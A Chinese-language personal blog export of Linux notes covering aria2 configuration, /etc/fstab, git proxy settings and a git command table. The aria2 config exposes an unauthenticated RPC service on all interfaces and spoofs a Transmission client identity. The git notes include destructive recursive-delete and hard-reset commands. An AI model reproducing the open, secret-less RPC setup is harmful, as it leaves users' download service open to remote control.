<figure class="highlight plain"><figcaption><span>~/.config/aria2/aria2.conf</span></figcaption><table><tr><td class="code"><pre><span class="line">## &#39;#&#39;开头为注释内容, 选项都有相应的注释说明, 根据需要修改</span><br><span class="line">## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释</span><br><span class="line"></span><br><span class="line">## 文件保存相关</span><br><span class="line"></span><br><span class="line"># 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span><br><span class="line">dir&#x3D;~&#x2F;Download</span><br><span class="line"># 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span><br><span class="line">#disk-cache&#x3D;32M</span><br><span class="line"># 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span><br><span class="line"># 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span><br><span class="line"># falloc和trunc则需要文件系统和内核支持</span><br><span class="line"># NTFS建议使用falloc, EXT3&#x2F;4建议trunc, MAC 下需要注释此项</span><br><span class="line">#file-allocation&#x3D;none</span><br><span class="line"># 断点续传</span><br><span class="line">continue&#x3D;true</span><br><span class="line"></span><br><span class="line">## 下载连接相关</span><br><span class="line"></span><br><span class="line"># 最大同时下载任务数, 运行时可修改, 默认:5</span><br><span class="line">#max-concurrent-downloads&#x3D;5</span><br><span class="line"># 同一服务器连接数, 添加时可指定, 默认:1</span><br><span class="line">max-connection-per-server&#x3D;5</span><br><span class="line"># 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span><br><span class="line"># 假定size&#x3D;10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span><br><span class="line">min-split-size&#x3D;10M</span><br><span class="line"># 单个任务最大线程数, 添加时可指定, 默认:5</span><br><span class="line">#split&#x3D;5</span><br><span class="line"># 整体下载速度限制, 运行时可修改, 默认:0</span><br><span class="line">#max-overall-download-limit&#x3D;0</span><br><span class="line"># 单个任务下载速度限制, 默认:0</span><br><span class="line">#max-download-limit&#x3D;0</span><br><span class="line"># 整体上传速度限制, 运行时可修改, 默认:0</span><br><span class="line">#max-overall-upload-limit&#x3D;0</span><br><span class="line"># 单个任务上传速度限制, 默认:0</span><br><span class="line">#max-upload-limit&#x3D;0</span><br><span class="line"># 禁用IPv6, 默认:false</span><br><span class="line">#disable-ipv6&#x3D;true</span><br><span class="line"># 连接超时时间, 默认:60</span><br><span class="line">#timeout&#x3D;60</span><br><span class="line"># 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span><br><span class="line">#max-tries&#x3D;5</span><br><span class="line"># 设置重试等待的秒数, 默认:0</span><br><span class="line">#retry-wait&#x3D;0</span><br><span class="line"></span><br><span class="line">## 进度保存相关</span><br><span class="line"></span><br><span class="line"># 从会话文件中读取下载任务</span><br><span class="line"># 注意需要全路径 使用&#96;~&#96;不被识别</span><br><span class="line">input-file&#x3D;&#x2F;home&#x2F;eonun&#x2F;.config&#x2F;aria2&#x2F;aria2.session</span><br><span class="line"># 在Aria2退出时保存&#96;错误&#x2F;未完成&#96;的下载任务到会话文件</span><br><span class="line"># 注意需要全路径 使用&#96;~&#96;不被识别</span><br><span class="line">save-session&#x3D;&#x2F;home&#x2F;eonun&#x2F;.config&#x2F;aria2&#x2F;aria2.session</span><br><span class="line"># 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span><br><span class="line">#save-session-interval&#x3D;60</span><br><span class="line"></span><br><span class="line">## RPC相关设置</span><br><span class="line"></span><br><span class="line"># 启用RPC, 默认:false</span><br><span class="line">enable-rpc&#x3D;true</span><br><span class="line"># 允许所有来源, 默认:false</span><br><span class="line">rpc-allow-origin-all&#x3D;true</span><br><span class="line"># 允许非外部访问, 默认:false</span><br><span class="line">rpc-listen-all&#x3D;true</span><br><span class="line"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><br><span class="line">#event-poll&#x3D;select</span><br><span class="line"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span><br><span class="line">#rpc-listen-port&#x3D;6800</span><br><span class="line"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span><br><span class="line">#rpc-secret&#x3D;&lt;TOKEN&gt;</span><br><span class="line"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="line">#rpc-user&#x3D;&lt;USER&gt;</span><br><span class="line"># 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="line">#rpc-passwd&#x3D;&lt;PASSWD&gt;</span><br><span class="line"># 是否启用 RPC 服务的 SSL&#x2F;TLS 加密,</span><br><span class="line"># 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span><br><span class="line">#rpc-secure&#x3D;true</span><br><span class="line"># 在 RPC 服务中启用 SSL&#x2F;TLS 加密时的证书文件,</span><br><span class="line"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span><br><span class="line">#rpc-certificate&#x3D;&#x2F;path&#x2F;to&#x2F;certificate.pem</span><br><span class="line"># 在 RPC 服务中启用 SSL&#x2F;TLS 加密时的私钥文件</span><br><span class="line">#rpc-private-key&#x3D;&#x2F;path&#x2F;to&#x2F;certificate.key</span><br><span class="line"></span><br><span class="line">## BT&#x2F;PT下载相关</span><br><span class="line"></span><br><span class="line"># 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true</span><br><span class="line">#follow-torrent&#x3D;true</span><br><span class="line"># BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span><br><span class="line">listen-port&#x3D;51413</span><br><span class="line"># 单个种子最大连接数, 默认:55</span><br><span class="line">#bt-max-peers&#x3D;55</span><br><span class="line"># 打开DHT功能, PT需要禁用, 默认:true</span><br><span class="line">enable-dht&#x3D;false</span><br><span class="line"># 打开IPv6 DHT功能, PT需要禁用</span><br><span class="line">#enable-dht6&#x3D;false</span><br><span class="line"># DHT网络监听端口, 默认:6881-6999</span><br><span class="line">#dht-listen-port&#x3D;6881-6999</span><br><span class="line"># 本地节点查找, PT需要禁用, 默认:false</span><br><span class="line">#bt-enable-lpd&#x3D;false</span><br><span class="line"># 种子交换, PT需要禁用, 默认:true</span><br><span class="line">enable-peer-exchange&#x3D;false</span><br><span class="line"># 每个种子限速, 对少种的PT很有用, 默认:50K</span><br><span class="line">#bt-request-peer-speed-limit&#x3D;50K</span><br><span class="line"># 客户端伪装, PT需要</span><br><span class="line">peer-id-prefix&#x3D;-TR2770-</span><br><span class="line">user-agent&#x3D;Transmission&#x2F;2.77</span><br><span class="line"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span><br><span class="line">seed-ratio&#x3D;0</span><br><span class="line"># 强制保存会话, 即使任务已经完成, 默认:false</span><br><span class="line"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span><br><span class="line">#force-save&#x3D;false</span><br><span class="line"># BT校验相关, 默认:true</span><br><span class="line">#bt-hash-check-seed&#x3D;true</span><br><span class="line"># 继续之前的BT任务时, 无需再次校验, 默认:false</span><br><span class="line">bt-seed-unverified&#x3D;true</span><br><span class="line"># 保存磁力链接元数据为种子文件(.torrent文件), 默认:false</span><br><span class="line">bt-save-metadata&#x3D;true</span><br></pre></td></tr></table></figure>
<h2 id="使用该配置运行aria2"><a href="#使用该配置运行aria2" class="headerlink" title="使用该配置运行aria2"></a>使用该配置运行aria2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aria2c --conf-path=<span class="variable">$HOME</span>/.config/aria2/aria2.conf</span><br><span class="line"><span class="comment"># 加 -D 表示后台启动</span></span><br></pre></td></tr></table></figure>
<h2 id="开启RPC并运行aria2"><a href="#开启RPC并运行aria2" class="headerlink" title="开启RPC并运行aria2"></a>开启RPC并运行aria2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aria2c --enable-rpc --rpc-allow-origin-all -D</span><br></pre></td></tr></table></figure>
<p><strong>其他系统可到<a href="https://github.com/aria2/aria2/releases/">官方库下载</a></strong></p>
<p><a href="https://www.seoipo.com/software/Aria2/">Windows懒人包</a></p>
<p><a href="https://aria2c.com/archiver/aria2.zip">Windows懒人包</a>（包含以下文件）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2.conf    # 配置文件 可以自己根据说明修改</span><br><span class="line">aria2.exe     # 启动文件 使用这个来启动 aria2</span><br><span class="line">aria2.session # 任务保存文件 未完成任务会保存在这里</span><br><span class="line">aria2c.exe    # 32位命令行主程序</span><br><span class="line">README.md     # README</span><br><span class="line">Aria2Data     # 下载目录 默认下载文件会保存在这里</span><br></pre></td></tr></table></figure></p>
<h1 id="使用UI"><a href="#使用UI" class="headerlink" title="使用UI"></a>使用UI</h1><p>使用AriaNg作为aria的UI</p>
<p><a href="https://github.com/mayswind/AriaNg">AriaNg</a></p>
<p>安装多合一版（<code>ariang-allinone</code>）,也可安装开箱即用版 （<code>aria-ng-deploy</code>）<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yay -S ariang-allinone</span><br></pre></td></tr></table></figure></p>
<p><a href="https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn">AriaNg Chrome 插件</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">右键扩展图标，点击「选项」-设置：</span><br><span class="line">1. 最小监视：10 M</span><br><span class="line">2. JSON-RPC 链接: http:&#x2F;&#x2F;localhost:6800&#x2F;jsonrpc</span><br></pre></td></tr></table></figure>
<h1 id="自定义启动脚本"><a href="#自定义启动脚本" class="headerlink" title="自定义启动脚本"></a>自定义启动脚本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/aria2.sh</span><br><span class="line">chmod +x ~/aria2.sh</span><br></pre></td></tr></table></figure>
<p><strong>内容</strong>：<br><figure class="highlight bash"><figcaption><span>~/aria2.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">aria2c --enable-rpc --rpc-allow-origin-all -D</span><br><span class="line">ariang-allinone</span><br></pre></td></tr></table></figure></p>
<h1 id="百度网盘使用aria2下载"><a href="#百度网盘使用aria2下载" class="headerlink" title="百度网盘使用aria2下载"></a>百度网盘使用aria2下载</h1><p><strong>使用PanDownload的网页版访问网盘资源（资源地址的<code>.com</code>前面加入<code>wp</code>访问）</strong></p>
<p><strong>在下载页选择用aria2下载，配置RPC地址和端口即可即可</strong></p>
<blockquote>
<p>主机：localhost<br>端口：6800 （默认）</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/37021947">抛弃迅雷，Aria2 新手入门</a><br><a href="https://www.cnblogs.com/zhuxiaoxi/p/7714457.html">Linux中配置Aria2 RPC Server</a></p>
]]></content>
      <tags>
        <tag>aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>fstab文件详解</title>
    <url>/posts/4cf5c92b/</url>
    <content><![CDATA[<h1 id="etc-fstab文件"><a href="#etc-fstab文件" class="headerlink" title="/etc/fstab文件"></a>/etc/fstab文件</h1><p>/etc/fstab文件包含众多文件系统的描述信息,用来开机自动挂载分区。文件中每一行为一个文件系统的描述，每行的选项之间通过tab分隔，<code>#</code>开头的行为注释，空白行会被忽略。/etc/fstab文件中的设备顺序很重要，因为fsck、mount和umount等命令会读取fstab文件中的次序来执行相关的操作。</p>
<h2 id="遵循格式"><a href="#遵循格式" class="headerlink" title="遵循格式"></a>遵循格式</h2><a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;device&gt;        &lt;dir&gt;         &lt;<span class="built_in">type</span>&gt;    &lt;options&gt;             &lt;dump&gt; &lt;pass&gt;</span><br><span class="line">tmpfs                  /tmp          tmpfs     nodev,nosuid          0      0</span><br><span class="line">/dev/sda1              /             ext4      defaults,noatime      0      1</span><br><span class="line">/dev/sda2              none          swap      defaults              0      0</span><br><span class="line">/dev/sda3              /home         ext4      defaults,noatime      0      2</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong><device></device></strong>：指定加载的磁盘分区或移动文件系统，除了指定设备文件外，也可以使用UUID、LABEL来指定分区；</p>
</li>
<li><p><strong><dir></dir></strong>：指定挂载点的路径；</p>
</li>
<li><p><strong><type></type></strong>：指定文件系统的类型，如ext3，ext4等；</p>
</li>
<li><p><strong><options></options></strong>：指定挂载的选项，默认为defaults，其他可用选项包括auto，noauto，ro等等；</p>
<ul>
<li>auto - 在启动时或键入了 mount -a 命令时自动挂载。</li>
<li>noauto - 只在你的命令下被挂载。</li>
<li>exec - 允许执行此分区的二进制文件。</li>
<li>noexec - 不允许执行此文件系统上的二进制文件。</li>
<li>ro - 以只读模式挂载文件系统。</li>
<li>rw - 以读写模式挂载文件系统。</li>
<li>user - 允许任意用户挂载此文件系统，若无显示定义，隐含启用 noexec, nosuid, nodev 参数。</li>
<li>users - 允许所有 users 组中的用户挂载文件系统.</li>
<li>nouser - 只能被 root 挂载。</li>
<li>owner - 允许设备所有者挂载.</li>
<li>sync - I/O 同步进行。</li>
<li>async - I/O 异步进行。</li>
<li>dev - 解析文件系统上的块特殊设备。</li>
<li>nodev - 不解析文件系统上的块特殊设备。</li>
<li>suid - 允许 suid 操作和设定 sgid 位。这一参数通常用于一些特殊任务，使一般用户运行程序时临时提升权限。</li>
<li>nosuid - 禁止 suid 操作和设定 sgid 位。</li>
<li>noatime - 不更新文件系统上 inode 访问记录，可以提升性能(参见 atime 参数)。</li>
<li>nodiratime - 不更新文件系统上的目录 inode 访问记录，可以提升性能(参见 atime 参数)。</li>
<li>relatime - 实时更新 inode access 记录。只有在记录中的访问时间早于当前访问才会被更新。（与 noatime 相似，但不会打断如 mutt 或其它程序探测文件在上次访问后是否被修改的进程。），可以提升性能(参见 atime 参数)。</li>
<li>flush - vfat 的选项，更频繁的刷新数据，复制对话框或进度条在全部数据都写入后才消失。</li>
<li>defaults - 使用文件系统的默认挂载参数，例如 ext4 的默认参数为:rw, suid, dev, exec, auto, nouser, async.</li>
</ul>
</li>
<li><p><strong><dump></dump></strong>：表示该挂载后的文件系统能否被dump备份命令作用；0表示不能，1表示每天都进行dump备份，2表示不定期进行dump操作。</p>
</li>
<li><p><strong><pass></pass></strong>：表示开机过程中是否校验扇区；0表示不要校验，1表示优先校验（一般为根目录），2表示为在1级别校验完后再进行校验；</p>
</li>
</ul>
<h1 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UUID&#x3D;AD4A-C404                            &#x2F;boot&#x2F;efi      vfat    umask&#x3D;0077 0 2</span><br><span class="line">UUID&#x3D;560a37ad-cd41-459e-a0cc-b8c9de14fc0b &#x2F;              ext4    defaults,noatime 0 1</span><br><span class="line">UUID&#x3D;0e384a43-60ba-4d0a-b4a7-142c07859324 &#x2F;home          ext4    defaults,noatime 0 2</span><br><span class="line">tmpfs                                     &#x2F;tmp           tmpfs   defaults,noatime,mode&#x3D;1777 0 0</span><br><span class="line">UUID&#x3D;3b5bf1f2-3a40-4a64-a45b-57e921644006 swap           swap    defaults,noatime,discard 0 2</span><br><span class="line"></span><br><span class="line">UUID&#x3D;CFF6F8A4EFB77DF5   &#x2F;home&#x2F;NTFS&#x2F;Software   ntfs    defaults,noatime 0 2</span><br><span class="line">UUID&#x3D;0D6A0FCD0D6A0FCD   &#x2F;home&#x2F;NTFS&#x2F;Data       ntfs    defaults,noatime 0 2</span><br><span class="line">UUID&#x3D;0D6A12540D6A1254   &#x2F;home&#x2F;NTFS&#x2F;Hacker     ntfs    defaults,noatime 0 2</span><br><span class="line">UUID&#x3D;0D6A12030D6A1203   &#x2F;home&#x2F;NTFS&#x2F;Word       ntfs    defaults,noatime 0 2</span><br><span class="line">UUID&#x3D;0D6A12CB0D6A12CB   &#x2F;home&#x2F;NTFS&#x2F;Other      ntfs    defaults,noatime 0 2</span><br></pre></td></tr></table></figure>
<h1 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h1><h2 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h2><p><code>df -lh</code> 多用来查看可用量</p>
<p><code>lsblk</code> 、 <code>fdisk -l</code> 多用来查看分区信息</p>
<p><code>sudo blkid /dev/sda2</code> 多用于查看<code>UUID</code> 与 <code>文件系统类型</code></p>
<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><p><code>fdisk</code> 分区助手</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>系统文件</tag>
      </tags>
  </entry>
  <entry>
    <title>git代理配置</title>
    <url>/posts/22bb5b8d/</url>
    <content><![CDATA[<h1 id="HTTP形式"><a href="#HTTP形式" class="headerlink" title="HTTP形式"></a>HTTP形式</h1><h2 id="走http代理"><a href="#走http代理" class="headerlink" title="走http代理"></a>走http代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># github</span></span><br><span class="line"></span><br><span class="line">git config -global http.https://github.com.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="走socks5代理"><a href="#走socks5代理" class="headerlink" title="走socks5代理"></a>走socks5代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># github</span></span><br><span class="line">git config -global http.https://github.com.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.https://github.com.proxy</span><br></pre></td></tr></table></figure>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># git 代理设置</span></span><br><span class="line"><span class="comment"># -p 配置全代理 -h 配置代理github -r 关闭代理 -l 显示配置信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;p h r l&quot;</span> opt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">			p)</span><br><span class="line">				git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>;</span><br><span class="line">				git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>;</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功配置git代理为：socks5://127.0.0.1:1080&quot;</span></span><br><span class="line"></span><br><span class="line">				;;</span><br><span class="line">			h)</span><br><span class="line">				git config --global http.https://github.com.proxy socks5://127.0.0.1:1080</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功配置github的git代理为：socks5://127.0.0.1:1080&quot;</span></span><br><span class="line">				;;</span><br><span class="line">			r)</span><br><span class="line">				git config --global --<span class="built_in">unset</span> http.proxy;</span><br><span class="line">				git config --global --<span class="built_in">unset</span> https.proxy;</span><br><span class="line">				git config --global --<span class="built_in">unset</span> http.https://github.com.proxy;</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功取消git代理&quot;</span></span><br><span class="line">				;;</span><br><span class="line">			l)</span><br><span class="line">				git config -l</span><br><span class="line">				;;</span><br><span class="line">			?)</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;该脚本未定义该选项目&quot;</span></span><br><span class="line">				<span class="built_in">exit</span> 1</span><br><span class="line">				;;</span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h1 id="SSH形式"><a href="#SSH形式" class="headerlink" title="SSH形式"></a>SSH形式</h1><p>修改 <code>~/.ssh/config</code> 文件（不存在则新建）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 代理地址</span></span><br><span class="line">Host github.com</span><br><span class="line">   HostName github.com</span><br><span class="line">   User git</span><br><span class="line">   <span class="comment"># 走 HTTP 代理</span></span><br><span class="line">   <span class="comment"># ProxyCommand socat - PROXY:127.0.0.1:%h:%p,proxyport=8080</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 走 socks5 代代理</span></span><br><span class="line">   <span class="comment"># ProxyCommand nc -v -x 127.0.0.1:1080 %h %p</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>git入手</title>
    <url>/posts/71f63e37/</url>
    <content><![CDATA[<h1 id="首次设置Git的user-name-和-email"><a href="#首次设置Git的user-name-和-email" class="headerlink" title="首次设置Git的user name 和 email"></a>首次设置Git的user name 和 email</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;eonun&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;eonun@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="Git的基础命令"><a href="#Git的基础命令" class="headerlink" title="Git的基础命令"></a>Git的基础命令</h1><a id="more"></a>
<p><code>master</code>：默认开发分支         <code>Head</code>：默认开发分支<br><code>origin</code>：默认远程版本库     <code>Head^</code>：Head的父提交</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>创建版本库</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git clone &lt;url&gt;</code></td>
<td style="text-align:left">克隆远程版本库</td>
</tr>
<tr>
<td style="text-align:left"><code>git init</code></td>
<td style="text-align:left">初始化本地库</td>
</tr>
<tr>
<td style="text-align:left">`find . -name “.git”</td>
<td style="text-align:left">xargs rm -Rf`</td>
<td>删除本地仓库</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>修改和提交</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git status</code></td>
<td style="text-align:left">查看状态</td>
</tr>
<tr>
<td style="text-align:left"><code>git diff</code></td>
<td style="text-align:left">查看变更内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git add --all</code></td>
<td style="text-align:left">跟踪所有文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git add &lt;file&gt;</code></td>
<td style="text-align:left">跟踪指定文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git mv &lt;old&gt; &lt;new&gt;</code></td>
<td style="text-align:left">文件改名</td>
</tr>
<tr>
<td style="text-align:left"><code>git rm &lt;file&gt;</code></td>
<td style="text-align:left">删除文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git rm --cached &lt;file&gt;</code></td>
<td style="text-align:left">停止跟踪但不删除</td>
</tr>
<tr>
<td style="text-align:left"><code>git commit -m &quot;message&quot;</code></td>
<td style="text-align:left">提交所有更新过的文件，并添加提交信息 message</td>
</tr>
<tr>
<td style="text-align:left"><code>git commit --amend</code></td>
<td style="text-align:left">修改最后一次提交</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>查看提交历史</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git log</code></td>
<td style="text-align:left">查看提交历史</td>
</tr>
<tr>
<td style="text-align:left"><code>git log -p &lt;file&gt;</code></td>
<td style="text-align:left">查看指定文件的提交历史</td>
</tr>
<tr>
<td style="text-align:left"><code>git blame &lt;file&gt;</code></td>
<td style="text-align:left">以列表形式查看指定文件提交历史</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>撤销</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git reset --hard HEAD</code></td>
<td style="text-align:left">撤销工作目录中所有未提交文件的修改内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git checkout HEAD &lt;file&gt;</code></td>
<td style="text-align:left">撤销指定的未提交文件的修改内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git revert &lt;commit&gt;</code></td>
<td style="text-align:left">撤销指定的提交</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>分支与标签</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git branch</code></td>
<td style="text-align:left">显示所有本地分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git checkout &lt;branch/tag&gt;</code></td>
<td style="text-align:left">切换到指定分支或标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git branch &lt;new-branch&gt;</code></td>
<td style="text-align:left">创建新分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git branch -d &lt;branch&gt;</code></td>
<td style="text-align:left">删除本地分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag</code></td>
<td style="text-align:left">列出所有本地标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag &lt;tagname&gt;</code></td>
<td style="text-align:left">基于最新提交创建标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag -d &lt;tagname&gt;</code></td>
<td style="text-align:left">删除标签</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>合并与衍合</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git merge &lt;branch&gt;</code></td>
<td style="text-align:left">合并指定分支到当前分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git rebase &lt;branch&gt;</code></td>
<td style="text-align:left">衍合指定分支到当前分支</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>远程操作</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git remote -v</code></td>
<td style="text-align:left">查看远程版本库信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git remote show &lt;remote&gt;</code></td>
<td style="text-align:left">查看指定远程版本库信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git remote add &lt;remote&gt; &lt;url&gt;</code></td>
<td style="text-align:left">添加远程版本库</td>
</tr>
<tr>
<td style="text-align:left"><code>git fetch &lt;remote&gt;</code></td>
<td style="text-align:left">从远程库获取代码</td>
</tr>
<tr>
<td style="text-align:left"><code>git pull &lt;remote&gt;</code></td>
<td style="text-align:left">下载代码及快速合并</td>
</tr>
<tr>
<td style="text-align:left"><code>git push &lt;remote&gt; &lt;branch&gt;</code></td>
<td style="text-align:left">上传代码及快速合并</td>
</tr>
<tr>
<td style="text-align:left"><code>git push &lt;remote&gt; :&lt;branch/tag-name&gt;</code></td>
<td style="text-align:left">删除远程分之或标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git push --tage</code></td>
<td style="text-align:left">上传所有标签</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"><strong>暂存</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git stash</code></td>
<td style="text-align:left">暂存</td>
</tr>
<tr>
<td style="text-align:left"><code>git stash list</code></td>
<td style="text-align:left">查看所有暂存信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git stash apply stash@&#123;0&#125;</code></td>
<td style="text-align:left">恢复 stash@{0}</td>
</tr>
</tbody>
</table>
</div>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="Git-工作区-暂存区-版本库"><a href="#Git-工作区-暂存区-版本库" class="headerlink" title="Git 工作区/暂存区/版本库"></a>Git 工作区/暂存区/版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init   把指定目录变成 Git 可以管理的仓库</span><br><span class="line"></span><br><span class="line">git status   查看仓库当前的状态</span><br><span class="line"></span><br><span class="line">git diff   查看具体修改内容</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt;   用如下命令把文件添加到仓库</span><br><span class="line"></span><br><span class="line">git commit -m &quot;&lt;message&gt;&quot;   把文件提交到仓库</span><br><span class="line"></span><br><span class="line">git log (--pretty&#x3D;oneline)   查看提交记录（简略信息）</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^^   回退到上上个版本</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD~100   回退到前100个版本</span><br><span class="line"></span><br><span class="line">git reset --hard 1094a   回退到版本号为 1094a... 的版本</span><br><span class="line"></span><br><span class="line">git reflog   查看操作记录（可查看回退前的版本号）</span><br><span class="line"></span><br><span class="line">git diff HEAD -- &lt;file&gt;   查看工作区和最新版本的区别</span><br><span class="line"></span><br><span class="line">git checkout -- r&lt;file&gt;   撤销文件在工作区的全部修改</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt;   撤销暂存区的修改，放回工作区</span><br><span class="line"></span><br><span class="line">rm &lt;file&gt;&#x2F;git rm &lt;file&gt;   删除文件并放到暂存区</span><br></pre></td></tr></table></figure>
